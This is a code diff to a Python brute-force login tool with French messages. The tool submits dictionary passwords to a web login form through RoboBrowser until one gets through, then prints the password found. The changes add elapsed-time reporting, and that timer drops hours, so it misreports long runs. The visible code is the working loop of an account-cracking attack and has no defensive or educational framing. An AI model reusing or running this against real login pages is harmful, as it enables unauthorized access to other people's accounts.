@@ -11,6 +11,8 @@ class BruteForceLogin:
     dict_name = ''
     username = ''
     passname = ''
+    start_time = ''
+    end_time = ''
 
     def __init__(self):
         self.print_welcome()
@@ -48,6 +50,7 @@ class BruteForceLogin:
 
     # En faire une classe
     def brute_force_login(self, passwords):
+        self.start_time = time()
         browser = RoboBrowser(history=True)
         browser.open(self.url)
 
@@ -62,10 +65,11 @@ class BruteForceLogin:
             form.serialize()
             browser.submit_form(form)
             if browser.url != self.url:
-                print("Mot de passe trouvé! " + password)
+                minutes_elapsed = self.get_minutes_elapsed()
+                print("Mot de passe trouvé en " + minutes_elapsed + " minutes: " + password)
                 sys.exit(1)
             else:
-                print("le mot de passe" + password + "n\'a pas fonctionné...")
+                print("le mot de passe " + password + " n\'a pas fonctionné...")
 
         print("Le compte utilisateur n'a pas pu être hacké.")
 
@@ -77,7 +81,7 @@ class BruteForceLogin:
         for form in forms:
             str_form = form.prettify()
             if self.username in str_form and self.passname in str_form:
-                str_after_name = str_form.split("name=\"", 1)[1]  # ex: <form name="uid" id="id">
+                str_after_name = str_form.split("name=\"", 1)[1]  # ex: <form name="uid" id="id">...
                                                                  # devient
                                                                  #  uid" id="id">
 
@@ -87,6 +91,13 @@ class BruteForceLogin:
 
         print("Le formulaire avec les noms de champs spécifiés sont introuvables, fermeture de l'application")
         sys.exit(1)
+
+    def get_minutes_elapsed(self):
+        self.end_time = time()
+        hours, rem = divmod(self.end_time - self.start_time, 3600)
+        minutes, seconds = divmod(rem, 60)
+        return "{:0}".format(int(minutes))
+
 
 
 if __name__ == '__main__':
